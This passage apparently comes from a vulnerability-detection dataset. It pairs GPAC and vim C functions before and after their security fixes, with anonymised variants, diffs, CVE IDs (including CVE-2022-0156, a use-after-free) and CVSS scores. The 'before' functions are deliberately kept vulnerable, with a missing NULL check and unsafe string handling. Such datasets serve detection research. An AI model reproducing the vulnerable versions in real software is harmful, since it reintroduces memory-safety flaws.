					VAR_25->decoderConfig->maxBitrate = 0;
				}
				VAR_25->URLString = (char*)gf_malloc(sizeof(char) * (strlen(VAR_16)+1));
				strcpy(VAR_25->URLString, VAR_16);
			} else {
				GF_LOG(VAR_31, VAR_29, (""[rtp hinter] Scene description sample too large to be embedded in IOD - ISMA disabled\n""));
				VAR_26 = 0;
			}
			gf_isom_sample_del(&VAR_12);
		}

		if (VAR_25) {
			if (VAR_13) VAR_25->OCRESID = 0;
			else if (VAR_25->OCRESID == VAR_25->ESID) VAR_25->OCRESID = 0;

			gf_list_add(VAR_10->ESDescriptors, VAR_25);
		}

		if (VAR_26) {
			u32 VAR_32, VAR_33, VAR_34, VAR_35;
			VAR_32 = VAR_33 = VAR_34 = VAR_35 = 0;
			for (VAR_4=0; VAR_4<gf_isom_get_track_count(VAR_1); VAR_4++) {
				VAR_25 = gf_isom_get_esd(VAR_1, VAR_4+1, 1);
				if (!VAR_25) continue;
				if (VAR_25->decoderConfig) {
					if (VAR_25->decoderConfig->streamType==VAR_36) {
						if (VAR_25->decoderConfig->objectTypeIndication==VAR_37) VAR_35 ++;
						else VAR_33++;
					} else if (VAR_25->decoderConfig->streamType==VAR_38) {
						if (VAR_25->decoderConfig->objectTypeIndication==VAR_39) VAR_34 ++;
						else VAR_32++;
					}
				}
				gf_odf_desc_del((GF_Descriptor *)VAR_25);
			}
			/* COMMENT_8 */
			if (!VAR_33 && !VAR_32 && (VAR_35<=1) && (VAR_34<=1)) {
				sprintf(VAR_16, ""a=isma-compliance:1,1.0,1"");
				gf_isom_sdp_add_line(VAR_1, VAR_16);
			}
		}
	}

	/* COMMENT_9 */
	VAR_14 = NULL;
	VAR_8 = 0;
	gf_odf_desc_write((GF_Descriptor *) VAR_10, &VAR_14, &VAR_8);
	gf_odf_desc_del((GF_Descriptor *)VAR_10);

	/* COMMENT_10 */
	VAR_9 = gf_base64_encode(VAR_14, VAR_8, VAR_15, 2000);
	VAR_15[VAR_9] = 0;
	gf_free(VAR_14);

	sprintf(VAR_16, ""a=mpeg4-iod:\""data:application/mpeg4-iod;base64,%s\"""", VAR_15);
	gf_isom_sdp_add_line(VAR_1, VAR_16);

	return VAR_18;
}",,"--- func_before
+++ func_after
@@ -132,10 +132,13 @@
 			}
 			gf_isom_sample_del(&samp);
 		}
-		if (remove_ocr) esd->OCRESID = 0;
-		else if (esd->OCRESID == esd->ESID) esd->OCRESID = 0;
 
-		gf_list_add(iod->ESDescriptors, esd);
+		if (esd) {
+			if (remove_ocr) esd->OCRESID = 0;
+			else if (esd->OCRESID == esd->ESID) esd->OCRESID = 0;
+
+			gf_list_add(iod->ESDescriptors, esd);
+		}
 
 		if (is_ok) {
 			u32 has_a, has_v, has_i_a, has_i_v;","{'deleted_lines': ['\t\tif (remove_ocr) esd->OCRESID = 0;', '\t\telse if (esd->OCRESID == esd->ESID) esd->OCRESID = 0;', '\t\tgf_list_add(iod->ESDescriptors, esd);'], 'added_lines': ['\t\tif (esd) {', '\t\t\tif (remove_ocr) esd->OCRESID = 0;', '\t\t\telse if (esd->OCRESID == esd->ESID) esd->OCRESID = 0;', '', '\t\t\tgf_list_add(iod->ESDescriptors, esd);', '\t\t}']}",True,A Pointer Dereference Vulnerability exists in GPAC 1.0.1 via the gf_hinter_finalize function.,5.5,MEDIUM,1,valid,2022-01-03T10:24:15Z,4
CVE-2022-0156,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,vim,"patch 8.2.4040: keeping track of allocated lines is too complicated

Problem:    Keeping track of allocated lines in user functions is too
            complicated.
Solution:   Instead of freeing individual lines keep them all until the end.",9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,https://github.com/vim/vim/commit/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,src/viminfo.c,read_viminfo_barline,"static int
read_viminfo_barline(vir_T *virp, int got_encoding, int force, int writing)
{
char_u*p = virp->vir_line + 1;
intbartype;
garray_Tvalues;
bval_T*vp;
inti;
intread_next = TRUE;
if (*p == '<')
{
if (writing)
ga_add_string(&virp->vir_barlines, virp->vir_line);
}
else
{
ga_init2(&values, sizeof(bval_T), 20);
bartype = getdigits(&p);
switch (bartype)
{
case BARTYPE_VERSION:
if (!got_encoding)
{
read_next = barline_parse(virp, p, &values);
vp = (bval_T *)values.ga_data;
if (values.ga_len > 0 && vp->bv_type == BVAL_NR)
virp->vir_version = vp->bv_nr;
}
break;
case BARTYPE_HISTORY:
read_next = barline_parse(virp, p, &values);
handle_viminfo_history(&values, writing);
break;
case BARTYPE_REGISTER:
read_next = barline_parse(virp, p, &values);
handle_viminfo_register(&values, force);
break;
case BARTYPE_MARK:
read_next = barline_parse(virp, p, &values);
handle_viminfo_mark(&values, force);
break;
default:
if (writing)
ga_add_string(&virp->vir_barlines, virp->vir_line);
}
for (i = 0; i < values.ga_len; ++i)
{
vp = (bval_T *)values.ga_data + i;
if (vp->bv_type == BVAL_STRING && vp->bv_allocated)
vim_free(vp->bv_string);
vim_free(vp->bv_tofree);
}
ga_clear(&values);
}
if (read_next)
return viminfo_readline(virp);
return FALSE;
}","static int
read_viminfo_barline(vir_T *VAR_0, int VAR_1, int VAR_2, int VAR_3)
{
char_u*VAR_4 = VAR_0->vir_line + 1;
intVAR_5;
garray_TVAR_6;
bval_T*VAR_7;
intVAR_8;
intVAR_9 = TRUE;
if (*VAR_4 == '<')
{
if (VAR_3)
ga_add_string(&VAR_0->vir_barlines, VAR_0->vir_line);
}
else
{
ga_init2(&VAR_6, sizeof(bval_T), 20);
VAR_5 = getdigits(&VAR_4);
switch (VAR_5)
{
case VAR_10:
if (!VAR_1)
{
VAR_9 = barline_parse(VAR_0, VAR_4, &VAR_6);
VAR_7 = (bval_T *)VAR_6.ga_data;
if (VAR_6.ga_len > 0 && VAR_7->bv_type == VAR_11)
VAR_0->vir_version = VAR_7->bv_nr;
}
break;
case VAR_12:
VAR_9 = barline_parse(VAR_0, VAR_4, &VAR_6);
handle_viminfo_history(&VAR_6, VAR_3);
break;
case VAR_13:
VAR_9 = barline_parse(VAR_0, VAR_4, &VAR_6);
handle_viminfo_register(&VAR_6, VAR_2);
break;
case VAR_14:
VAR_9 = barline_parse(VAR_0, VAR_4, &VAR_6);
handle_viminfo_mark(&VAR_6, VAR_2);
break;
default:
if (VAR_3)
ga_add_string(&VAR_0->vir_barlines, VAR_0->vir_line);
}
for (VAR_8 = 0; VAR_8 < VAR_6.ga_len; ++VAR_8)
{
VAR_7 = (bval_T *)VAR_6.ga_data + VAR_8;
if (VAR_7->bv_type == VAR_15 && VAR_7->bv_allocated)
vim_free(VAR_7->bv_string);
vim_free(VAR_7->bv_tofree);
}
ga_clear(&VAR_6);
}
if (VAR_9)
return viminfo_readline(VAR_0);
return FALSE;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/viminfo.c/vul/before/0.json,"static int
read_viminfo_barline(vir_T *virp, int got_encoding, int force, int writing)
{
    char_u	*p = virp->vir_line + 1;
    int		bartype;
    garray_T	values;
    bval_T	*vp;
    int		i;
    int		read_next = TRUE;

    // The format is: |{bartype},{value},...
    // For a very long string:
    //     |{bartype},>{length of ""{text}{text2}""}
    //     |<{text1}
    //     |<{text2},{value}
    // For a long line not using a string
    //     |{bartype},{lots of values},>
    //     |<{value},{value}
    if (*p == '<')
    {
	// Continuation line of an unrecognized item.
	if (writing)
	    ga_copy_string(&virp->vir_barlines, virp->vir_line);
    }
    else
    {
	ga_init2(&values, sizeof(bval_T), 20);
	bartype = getdigits(&p);
	switch (bartype)
	{
	    case BARTYPE_VERSION:
		// Only use the version when it comes before the encoding.
		// If it comes later it was copied by a Vim version that
		// doesn't understand the version.
		if (!got_encoding)
		{
		    read_next = barline_parse(virp, p, &values);
		    vp = (bval_T *)values.ga_data;
		    if (values.ga_len > 0 && vp->bv_type == BVAL_NR)
			virp->vir_version = vp->bv_nr;
		}
		break;

	    case BARTYPE_HISTORY:
		read_next = barline_parse(virp, p, &values);
		handle_viminfo_history(&values, writing);
		break;

	    case BARTYPE_REGISTER:
		read_next = barline_parse(virp, p, &values);
		handle_viminfo_register(&values, force);
		break;

	    case BARTYPE_MARK:
		read_next = barline_parse(virp, p, &values);
		handle_viminfo_mark(&values, force);
		break;

	    default:
		// copy unrecognized line (for future use)
		if (writing)
		    ga_copy_string(&virp->vir_barlines, virp->vir_line);
	}
	for (i = 0; i < values.ga_len; ++i)
	{
	    vp = (bval_T *)values.ga_data + i;
	    if (vp->bv_type == BVAL_STRING && vp->bv_allocated)
		vim_free(vp->bv_string);
	    vim_free(vp->bv_tofree);
	}
	ga_clear(&values);
    }

    if (read_next)
	return viminfo_readline(virp);
    return FALSE;
}","static int
read_viminfo_barline(vir_T *VAR_0, int VAR_1, int VAR_2, int VAR_3)
{
    char_u	*VAR_4 = VAR_0->vir_line + 1;
    int		VAR_5;
    garray_T	VAR_6;
    bval_T	*VAR_7;
    int		VAR_8;
    int		VAR_9 = TRUE;

    /* COMMENT_0 */
    /* COMMENT_1 */
    /* COMMENT_2 */
    /* COMMENT_3 */
    /* COMMENT_4 */
    /* COMMENT_5 */
    /* COMMENT_6 */
    /* COMMENT_7 */
    if (*VAR_4 == '<')
    {
	/* COMMENT_8 */
	if (VAR_3)
	    ga_copy_string(&VAR_0->vir_barlines, VAR_0->vir_line);
    }
    else
    {
	ga_init2(&VAR_6, sizeof(bval_T), 20);
	VAR_5 = getdigits(&VAR_4);
	switch (VAR_5)
	{
	    case VAR_10:
		/* COMMENT_9 */
		/* COMMENT_10 */
		/* COMMENT_11 */
		if (!VAR_1)
		{
		    VAR_9 = barline_parse(VAR_0, VAR_4, &VAR_6);
		    VAR_7 = (bval_T *)VAR_6.ga_data;
		    if (VAR_6.ga_len > 0 && VAR_7->bv_type == VAR_11)
			VAR_0->vir_version = VAR_7->bv_nr;
		}
		break;

	    case VAR_12:
		VAR_9 = barline_parse(VAR_0, VAR_4, &VAR_6);
		handle_viminfo_history(&VAR_6, VAR_3);
		break;

	    case VAR_13:
		VAR_9 = barline_parse(VAR_0, VAR_4, &VAR_6);
		handle_viminfo_register(&VAR_6, VAR_2);
		break;

	    case VAR_14:
		VAR_9 = barline_parse(VAR_0, VAR_4, &VAR_6);
		handle_viminfo_mark(&VAR_6, VAR_2);
		break;

	    default:
		/* COMMENT_12 */
		if (VAR_3)
		    ga_copy_string(&VAR_0->vir_barlines, VAR_0->vir_line);
	}
	for (VAR_8 = 0; VAR_8 < VAR_6.ga_len; ++VAR_8)
	{
	    VAR_7 = (bval_T *)VAR_6.ga_data + VAR_8;
	    if (VAR_7->bv_type == VAR_15 && VAR_7->bv_allocated)
		vim_free(VAR_7->bv_string);
	    vim_free(VAR_7->bv_tofree);
	}
	ga_clear(&VAR_6);
    }

    if (VAR_9)
	return viminfo_readline(VAR_0);
    return FALSE;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/viminfo.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -20,7 +20,7 @@
     {
 	// Continuation line of an unrecognized item.
 	if (writing)
-	    ga_add_string(&virp->vir_barlines, virp->vir_line);
+	    ga_copy_string(&virp->vir_barlines, virp->vir_line);
     }
     else
     {
@@ -59,7 +59,7 @@
 	    default:
 		// copy unrecognized line (for future use)
 		if (writing)
-		    ga_add_string(&virp->vir_barlines, virp->vir_line);
+		    ga_copy_string(&virp->vir_barlines, virp->vir_line);
 	}
 	for (i = 0; i < values.ga_len; ++i)
 	{","{'deleted_lines': ['\t    ga_add_string(&virp->vir_barlines, virp->vir_line);', '\t\t    ga_add_string(&virp->vir_barlines, virp->vir_line);'], 'added_lines': ['\t    ga_copy_string(&virp->vir_barlines, virp->vir_line);', '\t\t    ga_copy_string(&virp->vir_barlines, virp->vir_line);']}",True,vim is vulnerable to Use After Free,5.5,MEDIUM,1,valid,2022-01-08T15:39:39Z,4
CVE-2022-0156,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,vim,"patch 8.2.4040: keeping track of allocated lines is too complicated

Problem:    Keeping track of allocated lines in user functions is too
            complicated.
Solution:   Instead of freeing individual lines keep them all until the end.",9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,https://github.com/vim/vim/commit/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,src/vim9compile.c,compile_nested_function,"static char_u *
compile_nested_function(exarg_T *eap, cctx_T *cctx, char_u **line_to_free)
{
intis_global = *eap->arg == 'g' && eap->arg[1] == ':';
char_u*name_start = eap->arg;
char_u*name_end = to_name_end(eap->arg, TRUE);
intoff;
char_u*func_name;
char_u*lambda_name;
ufunc_T*ufunc;
intr = FAIL;
compiletype_T   compile_type;
if (eap->forceit)
{
emsg(_(e_cannot_use_bang_with_nested_def));
return NULL;
}
if (*name_start == '/')
{
name_end = skip_regexp(name_start + 1, '/', TRUE);
if (*name_end == '/')
++name_end;
set_nextcmd(eap, name_end);
}
if (name_end == name_start || *skipwhite(name_end) != '(')
{
if (!ends_excmd2(name_start, name_end))
{
semsg(_(e_invalid_command_str), eap->cmd);
return NULL;
}
if (generate_DEF(cctx, name_start, name_end - name_start) == FAIL)
return NULL;
return eap->nextcmd == NULL ? (char_u *)"""" : eap->nextcmd;
}
if (name_start[1] == ':' && !is_global)
{
semsg(_(e_namespace_not_supported_str), name_start);
return NULL;
}
if (check_defined(name_start, name_end - name_start, cctx, FALSE) == FAIL)
return NULL;
eap->arg = name_end;
fill_exarg_from_cctx(eap, cctx);
eap->forceit = FALSE;
lambda_name = vim_strsave(get_lambda_name());
if (lambda_name == NULL)
return NULL;
off = is_global ? 2 : 0;
func_name = vim_strnsave(name_start + off, name_end - name_start - off);
if (func_name == NULL)
{
r = FAIL;
goto theend;
}
ufunc = define_function(eap, lambda_name, line_to_free);
if (ufunc == NULL)
{
r = eap->skip ? OK : FAIL;
goto theend;
}
if (eap->nextcmd != NULL)
{
semsg(_(e_text_found_after_str_str),
eap->cmdidx == CMD_def ? ""enddef"" : ""endfunction"", eap->nextcmd);
r = FAIL;
func_ptr_unref(ufunc);
goto theend;
}
if (!is_global && cctx->ctx_ufunc->uf_block_depth > 0)
{
int block_depth = cctx->ctx_ufunc->uf_block_depth;
ufunc->uf_block_ids = ALLOC_MULT(int, block_depth);
if (ufunc->uf_block_ids != NULL)
{
mch_memmove(ufunc->uf_block_ids, cctx->ctx_ufunc->uf_block_ids,
sizeof(int) * block_depth);
ufunc->uf_block_depth = block_depth;
}
}
compile_type = COMPILE_TYPE(ufunc);
#ifdef FEAT_PROFILE
if (cctx->ctx_compile_type == CT_PROFILE)
compile_type = CT_PROFILE;
#endif
if (func_needs_compiling(ufunc, compile_type)
&& compile_def_function(ufunc, TRUE, compile_type, cctx) == FAIL)
{
func_ptr_unref(ufunc);
goto theend;
}
#ifdef FEAT_PROFILE
if (compile_type == CT_PROFILE && func_needs_compiling(ufunc, CT_NONE))
compile_def_function(ufunc, FALSE, CT_NONE, cctx);
#endif
if (is_global)
{
r = generate_NEWFUNC(cctx, lambda_name, func_name);
func_name = NULL;
lambda_name = NULL;
}
else
{
lvar_T*lvar = reserve_local(cctx, func_name, name_end - name_start,
TRUE, ufunc->uf_func_type);
if (lvar == NULL)
goto theend;
if (generate_FUNCREF(cctx, ufunc) == FAIL)
goto theend;
r = generate_STORE(cctx, ISN_STORE, lvar->lv_idx, NULL);
}
theend:
vim_free(lambda_name);
vim_free(func_name);
return r == FAIL ? NULL : (char_u *)"""";
}","static char_u *
compile_nested_function(exarg_T *VAR_0, cctx_T *VAR_1, char_u **VAR_2)
{
intVAR_3 = *VAR_0->arg == 'g' && VAR_0->arg[1] == ':';
char_u*VAR_4 = VAR_0->arg;
char_u*VAR_5 = to_name_end(VAR_0->arg, TRUE);
intVAR_6;
char_u*VAR_7;
char_u*VAR_8;
ufunc_T*VAR_9;
intVAR_10 = VAR_11;
compiletype_T   VAR_12;
if (VAR_0->forceit)
{
emsg(_(VAR_13));
return NULL;
}
if (*VAR_4 == '/')
{
VAR_5 = skip_regexp(VAR_4 + 1, '/', TRUE);
if (*VAR_5 == '/')
++VAR_5;
set_nextcmd(VAR_0, VAR_5);
}
if (VAR_5 == VAR_4 || *skipwhite(VAR_5) != '(')
{
if (!ends_excmd2(VAR_4, VAR_5))
{
semsg(_(VAR_14), VAR_0->cmd);
return NULL;
}
if (generate_DEF(VAR_1, VAR_4, VAR_5 - VAR_4) == VAR_11)
return NULL;
return VAR_0->nextcmd == NULL ? (char_u *)"""" : VAR_0->nextcmd;
}
if (VAR_4[1] == ':' && !VAR_3)
{
semsg(_(VAR_15), VAR_4);
return NULL;
}
if (check_defined(VAR_4, VAR_5 - VAR_4, VAR_1, FALSE) == VAR_11)
return NULL;
VAR_0->arg = VAR_5;
fill_exarg_from_cctx(VAR_0, VAR_1);
VAR_0->forceit = FALSE;
VAR_8 = vim_strsave(get_lambda_name());
if (VAR_8 == NULL)
return NULL;
VAR_6 = VAR_3 ? 2 : 0;
VAR_7 = vim_strnsave(VAR_4 + VAR_6, VAR_5 - VAR_4 - VAR_6);
if (VAR_7 == NULL)
{
VAR_10 = VAR_11;
goto theend;
}
VAR_9 = define_function(VAR_0, VAR_8, VAR_2);
if (VAR_9 == NULL)
{
VAR_10 = VAR_0->skip ? VAR_16 : VAR_11;
goto theend;
}
if (VAR_0->nextcmd != NULL)
{
semsg(_(VAR_17),
VAR_0->cmdidx == VAR_18 ? ""enddef"" : ""endfunction"", VAR_0->nextcmd);
VAR_10 = VAR_11;
func_ptr_unref(VAR_9);
goto theend;
}
if (!VAR_3 && VAR_1->ctx_ufunc->uf_block_depth > 0)
{
int VAR_19 = VAR_1->ctx_ufunc->uf_block_depth;
VAR_9->uf_block_ids = ALLOC_MULT(int, VAR_19);
if (VAR_9->uf_block_ids != NULL)
{
mch_memmove(VAR_9->uf_block_ids, VAR_1->ctx_ufunc->uf_block_ids,
sizeof(int) * VAR_19);
VAR_9->uf_block_depth = VAR_19;
}
}
VAR_12 = COMPILE_TYPE(VAR_9);
#ifdef VAR_20
if (VAR_1->ctx_compile_type == VAR_21)
VAR_12 = VAR_21;
#endif
if (func_needs_compiling(VAR_9, VAR_12)
&& compile_def_function(VAR_9, TRUE, VAR_12, VAR_1) == VAR_11)
{
func_ptr_unref(VAR_9);
goto theend;
}
#ifdef VAR_20
if (VAR_12 == VAR_21 && func_needs_compiling(VAR_9, VAR_22))
compile_def_function(VAR_9, FALSE, VAR_22, VAR_1);
#endif
if (VAR_3)
{
VAR_10 = generate_NEWFUNC(VAR_1, VAR_8, VAR_7);
VAR_7 = NULL;
VAR_8 = NULL;
}
else
{
lvar_T*VAR_23 = reserve_local(VAR_1, VAR_7, VAR_5 - VAR_4,
TRUE, VAR_9->uf_func_type);
if (VAR_23 == NULL)
goto theend;
if (generate_FUNCREF(VAR_1, VAR_9) == VAR_11)
goto theend;
VAR_10 = generate_STORE(VAR_1, VAR_24, VAR_23->lv_idx, NULL);
}
theend:
vim_free(VAR_8);
vim_free(VAR_7);
return VAR_10 == VAR_11 ? NULL : (char_u *)"""";
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/vim9compile.c/vul/before/0.json,"static char_u *
compile_nested_function(exarg_T *eap, cctx_T *cctx, garray_T *lines_to_free)
{
    int		is_global = *eap->arg == 'g' && eap->arg[1] == ':';
    char_u	*name_start = eap->arg;
    char_u	*name_end = to_name_end(eap->arg, TRUE);
    int		off;
    char_u	*func_name;
    char_u	*lambda_name;
    ufunc_T	*ufunc;
    int		r = FAIL;
    compiletype_T   compile_type;

    if (eap->forceit)
    {
	emsg(_(e_cannot_use_bang_with_nested_def));
	return NULL;
    }

    if (*name_start == '/')
    {
	name_end = skip_regexp(name_start + 1, '/', TRUE);
	if (*name_end == '/')
	    ++name_end;
	set_nextcmd(eap, name_end);
    }
    if (name_end == name_start || *skipwhite(name_end) != '(')
    {
	if (!ends_excmd2(name_start, name_end))
	{
	    semsg(_(e_invalid_command_str), eap->cmd);
	    return NULL;
	}

	// ""def"" or ""def Name"": list functions
	if (generate_DEF(cctx, name_start, name_end - name_start) == FAIL)
	    return NULL;
	return eap->nextcmd == NULL ? (char_u *)"""" : eap->nextcmd;
    }

    // Only g:Func() can use a namespace.
    if (name_start[1] == ':' && !is_global)
    {
	semsg(_(e_namespace_not_supported_str), name_start);
	return NULL;
    }
    if (check_defined(name_start, name_end - name_start, cctx, FALSE) == FAIL)
	return NULL;

    eap->arg = name_end;
    fill_exarg_from_cctx(eap, cctx);

    eap->forceit = FALSE;
    // We use the special <Lamba>99 name, but it's not really a lambda.
    lambda_name = vim_strsave(get_lambda_name());
    if (lambda_name == NULL)
	return NULL;

    // This may free the current line, make a copy of the name.
    off = is_global ? 2 : 0;
    func_name = vim_strnsave(name_start + off, name_end - name_start - off);
    if (func_name == NULL)
    {
	r = FAIL;
	goto theend;
    }

    ufunc = define_function(eap, lambda_name, lines_to_free);
    if (ufunc == NULL)
    {
	r = eap->skip ? OK : FAIL;
	goto theend;
    }
    if (eap->nextcmd != NULL)
    {
	semsg(_(e_text_found_after_str_str),
	      eap->cmdidx == CMD_def ? ""enddef"" : ""endfunction"", eap->nextcmd);
	r = FAIL;
	func_ptr_unref(ufunc);
	goto theend;
    }

    // copy over the block scope IDs before compiling
    if (!is_global && cctx->ctx_ufunc->uf_block_depth > 0)
    {
	int block_depth = cctx->ctx_ufunc->uf_block_depth;

	ufunc->uf_block_ids = ALLOC_MULT(int, block_depth);
	if (ufunc->uf_block_ids != NULL)
	{
	    mch_memmove(ufunc->uf_block_ids, cctx->ctx_ufunc->uf_block_ids,
						    sizeof(int) * block_depth);
	    ufunc->uf_block_depth = block_depth;
	}
    }

    compile_type = COMPILE_TYPE(ufunc);
#ifdef FEAT_PROFILE
    // If the outer function is profiled, also compile the nested function for
    // profiling.
    if (cctx->ctx_compile_type == CT_PROFILE)
	compile_type = CT_PROFILE;
#endif
    if (func_needs_compiling(ufunc, compile_type)
	    && compile_def_function(ufunc, TRUE, compile_type, cctx) == FAIL)
    {
	func_ptr_unref(ufunc);
	goto theend;
    }

#ifdef FEAT_PROFILE
    // When the outer function is compiled for profiling, the nested function
    // may be called without profiling.  Compile it here in the right context.
    if (compile_type == CT_PROFILE && func_needs_compiling(ufunc, CT_NONE))
	compile_def_function(ufunc, FALSE, CT_NONE, cctx);
#endif

    if (is_global)
    {
	r = generate_NEWFUNC(cctx, lambda_name, func_name);
	func_name = NULL;
	lambda_name = NULL;
    }
    else
    {
	// Define a local variable for the function reference.
	lvar_T	*lvar = reserve_local(cctx, func_name, name_end - name_start,
						    TRUE, ufunc->uf_func_type);

	if (lvar == NULL)
	    goto theend;
	if (generate_FUNCREF(cctx, ufunc) == FAIL)
	    goto theend;
	r = generate_STORE(cctx, ISN_STORE, lvar->lv_idx, NULL);
    }

theend:
    vim_free(lambda_name);
    vim_free(func_name);
    return r == FAIL ? NULL : (char_u *)"""";
}","static char_u *
compile_nested_function(exarg_T *VAR_0, cctx_T *VAR_1, garray_T *VAR_2)
{
    int		VAR_3 = *VAR_0->arg == 'g' && VAR_0->arg[1] == ':';
    char_u	*VAR_4 = VAR_0->arg;
    char_u	*VAR_5 = to_name_end(VAR_0->arg, TRUE);
    int		VAR_6;
    char_u	*VAR_7;
    char_u	*VAR_8;
    ufunc_T	*VAR_9;
    int		VAR_10 = VAR_11;
    compiletype_T   VAR_12;

    if (VAR_0->forceit)
    {
	emsg(_(VAR_13));
	return NULL;
    }

    if (*VAR_4 == '/')
    {
	VAR_5 = skip_regexp(VAR_4 + 1, '/', TRUE);
	if (*VAR_5 == '/')
	    ++VAR_5;
	set_nextcmd(VAR_0, VAR_5);
    }
    if (VAR_5 == VAR_4 || *skipwhite(VAR_5) != '(')
    {
	if (!ends_excmd2(VAR_4, VAR_5))
	{
	    semsg(_(VAR_14), VAR_0->cmd);
	    return NULL;
	}

	/* COMMENT_0 */
	if (generate_DEF(VAR_1, VAR_4, VAR_5 - VAR_4) == VAR_11)
	    return NULL;
	return VAR_0->nextcmd == NULL ? (char_u *)"""" : VAR_0->nextcmd;
    }

    /* COMMENT_1 */
    if (VAR_4[1] == ':' && !VAR_3)
    {
	semsg(_(VAR_15), VAR_4);
	return NULL;
    }
    if (check_defined(VAR_4, VAR_5 - VAR_4, VAR_1, FALSE) == VAR_11)
	return NULL;

    VAR_0->arg = VAR_5;
    fill_exarg_from_cctx(VAR_0, VAR_1);

    VAR_0->forceit = FALSE;
    /* COMMENT_2 */
    VAR_8 = vim_strsave(get_lambda_name());
    if (VAR_8 == NULL)
	return NULL;

    /* COMMENT_3 */
    VAR_6 = VAR_3 ? 2 : 0;
    VAR_7 = vim_strnsave(VAR_4 + VAR_6, VAR_5 - VAR_4 - VAR_6);
    if (VAR_7 == NULL)
    {
	VAR_10 = VAR_11;
	goto theend;
    }

    VAR_9 = define_function(VAR_0, VAR_8, VAR_2);
    if (VAR_9 == NULL)
    {
	VAR_10 = VAR_0->skip ? VAR_16 : VAR_11;
	goto theend;
    }
    if (VAR_0->nextcmd != NULL)
    {
	semsg(_(VAR_17),
	      VAR_0->cmdidx == VAR_18 ? ""enddef"" : ""endfunction"", VAR_0->nextcmd);
	VAR_10 = VAR_11;
	func_ptr_unref(VAR_9);
	goto theend;
    }

    /* COMMENT_4 */
    if (!VAR_3 && VAR_1->ctx_ufunc->uf_block_depth > 0)
    {
	int VAR_19 = VAR_1->ctx_ufunc->uf_block_depth;

	VAR_9->uf_block_ids = ALLOC_MULT(int, VAR_19);
	if (VAR_9->uf_block_ids != NULL)
	{
	    mch_memmove(VAR_9->uf_block_ids, VAR_1->ctx_ufunc->uf_block_ids,
						    sizeof(int) * VAR_19);
	    VAR_9->uf_block_depth = VAR_19;
	}
    }

    VAR_12 = COMPILE_TYPE(VAR_9);
#ifdef VAR_20
    /* COMMENT_5 */
    /* COMMENT_6 */
    if (VAR_1->ctx_compile_type == VAR_21)
	VAR_12 = VAR_21;
#endif
    if (func_needs_compiling(VAR_9, VAR_12)
	    && compile_def_function(VAR_9, TRUE, VAR_12, VAR_1) == VAR_11)
    {
	func_ptr_unref(VAR_9);
	goto theend;
    }

#ifdef VAR_20
    /* COMMENT_7 */
    /* COMMENT_8 */
    if (VAR_12 == VAR_21 && func_needs_compiling(VAR_9, VAR_22))
	compile_def_function(VAR_9, FALSE, VAR_22, VAR_1);
#endif

    if (VAR_3)
    {
	VAR_10 = generate_NEWFUNC(VAR_1, VAR_8, VAR_7);
	VAR_7 = NULL;
	VAR_8 = NULL;
    }
    else
    {
	/* COMMENT_9 */
	lvar_T	*VAR_23 = reserve_local(VAR_1, VAR_7, VAR_5 - VAR_4,
						    TRUE, VAR_9->uf_func_type);

	if (VAR_23 == NULL)
	    goto theend;
	if (generate_FUNCREF(VAR_1, VAR_9) == VAR_11)
	    goto theend;
	VAR_10 = generate_STORE(VAR_1, VAR_24, VAR_23->lv_idx, NULL);
    }

theend:
    vim_free(VAR_8);
    vim_free(VAR_7);
    return VAR_10 == VAR_11 ? NULL : (char_u *)"""";
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/vim9compile.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,5 +1,5 @@
 static char_u *
-compile_nested_function(exarg_T *eap, cctx_T *cctx, char_u **line_to_free)
+compile_nested_function(exarg_T *eap, cctx_T *cctx, garray_T *lines_to_free)
 {
     int		is_global = *eap->arg == 'g' && eap->arg[1] == ':';
     char_u	*name_start = eap->arg;
@@ -65,7 +65,7 @@
 	goto theend;
     }
 
-    ufunc = define_function(eap, lambda_name, line_to_free);
+    ufunc = define_function(eap, lambda_name, lines_to_free);
     if (ufunc == NULL)
     {
 	r = eap->skip ? OK : FAIL;","{'deleted_lines': ['compile_nested_function(exarg_T *eap, cctx_T *cctx, char_u **line_to_free)', '    ufunc = define_function(eap, lambda_name, line_to_free);'], 'added_lines': ['compile_nested_function(exarg_T *eap, cctx_T *cctx, garray_T *lines_to_free)', '    ufunc = define_function(eap, lambda_name, lines_to_free);']}",True,vim is vulnerable to Use After Free,5.5,MEDIUM,1,valid,2022-01-08T15:39:39Z,4
CVE-2022-0156,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,vim,"patch 8.2.4040: keeping track of allocated lines is too complicated

Problem:    Keeping track of allocated lines in user functions is too
            complicated.
Solution:   Instead of freeing individual lines keep them all until the end.",9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,https://github.com/vim/vim/commit/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,src/vim9compile.c,compile_def_function,"int
compile_def_function(
ufunc_T*ufunc,
intcheck_return_type,
compiletype_T   compile_type,
cctx_T*outer_cctx)
{
char_u*line = NULL;
char_u*line_to_free = NULL;
char_u*p;
char*errormsg = NULL;    cctx_Tcctx;
garray_T*instr;
intdid_emsg_before = did_emsg;
intdid_emsg_silent_before = did_emsg_silent;
intret = FAIL;
sctx_Tsave_current_sctx = current_sctx;
intsave_estack_compiling = estack_compiling;
intsave_cmod_flags = cmdmod.cmod_flags;
intdo_estack_push;
intnew_def_function = FALSE;
#ifdef FEAT_PROFILE
intprof_lnum = -1;
#endif
intdebug_lnum = -1;
if (ufunc->uf_dfunc_idx > 0)
{
dfunc_T *dfunc = ((dfunc_T *)def_functions.ga_data)
+ ufunc->uf_dfunc_idx;
isn_T*instr_dest = NULL;
switch (compile_type)
{
case CT_PROFILE:
#ifdef FEAT_PROFILE
instr_dest = dfunc->df_instr_prof; break;
#endif
case CT_NONE:   instr_dest = dfunc->df_instr; break;
case CT_DEBUG:  instr_dest = dfunc->df_instr_debug; break;
}
if (instr_dest != NULL)
delete_def_function_contents(dfunc, FALSE);
ga_clear_strings(&dfunc->df_var_names);
}
else
{
